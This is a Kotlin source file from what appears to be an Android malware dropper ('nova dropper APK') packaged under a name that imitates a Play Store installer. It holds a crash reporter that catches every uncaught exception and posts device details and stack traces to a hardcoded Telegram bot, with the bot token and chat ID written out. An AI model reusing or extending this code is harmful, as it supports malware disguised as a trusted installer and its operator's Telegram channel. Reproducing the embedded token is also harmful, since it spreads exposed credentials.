package com.playstore.installer

import android.content.Context
import android.os.Build
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * NovaCrashReporter — global crash reporter for the nova dropper APK.
 *
 * Implements Thread.UncaughtExceptionHandler to catch ALL crashes across
 * every thread (main, service, background) and send a full report to
 * Telegram instantly on a background thread.
 *
 * Usage: NovaCrashReporter.install(this) as first line in
 *        LauncherApplication.onCreate()
 */
object NovaCrashReporter {

    private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
    private const val CHAT_ID   = "8852912150"

    fun install(context: Context) {
        val appContext = context.applicationContext
        val prev = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                sendCrash(appContext, thread, throwable)
            } catch (_: Exception) { }
            // Delegate to previous handler (Android default = crash dialog / kill process)
            try { prev?.uncaughtException(thread, throwable) } catch (_: Exception) { }
        }
    }

    private fun sendCrash(context: Context, thread: Thread, throwable: Throwable) {
        val ts     = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(Date())
        val device = "${Build.MANUFACTURER} ${Build.MODEL} (API ${Build.VERSION.SDK_INT})"
        val pkg    = try { context.packageName } catch (_: Exception) { "unknown" }

        val stackTrace = buildString {
            appendLine(throwable.toString())
            throwable.stackTrace.take(30).forEach { appendLine("  at $it") }
            var cause = throwable.cause
            var depth = 0
            while (cause != null && depth < 3) {
                appendLine("Caused by: $cause")
                cause.stackTrace.take(10).forEach { appendLine("  at $it") }
                cause = cause.cause
                depth++
            }
        }

        val text = buildString {
            appendLine("💥 NOVA DROPPER CRASH")
            appendLine("🕐 $ts")
            appendLine("📲 $device")
            appendLine("📦 dropper=$pkg")
            appendLine("🧵 thread=${thread.name}")
            appendLine("─────────────────────")
            appendLine(stackTrace.take(3000))
        }

        // Send on a new thread — crash handler must never block main thread
        val t = Thread {
            try {
                val url  = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod      = "POST"
                conn.doOutput           = true
                conn.connectTimeout     = 10_000
                conn.readTimeout        = 10_000
                conn.setRequestProperty("Content-Type", "application/json")

                val escaped = text
                    .replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t")

                val payload = "{\"chat_id\":\"$CHAT_ID\",\"text\":\"$escaped\"}"
                val bytes   = payload.toByteArray(Charsets.UTF_8)
                conn.setRequestProperty("Content-Length", bytes.size.toString())
                val out: OutputStream = conn.outputStream
                out.write(bytes)
                out.flush()
                out.close()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) { }
        }
        t.isDaemon = false   // must NOT be daemon — keep alive until send completes
        t.name     = "nova-crash-reporter"
        t.start()
        try { t.join(9_000) } catch (_: Exception) { }  // wait up to 9s for send
    }
}
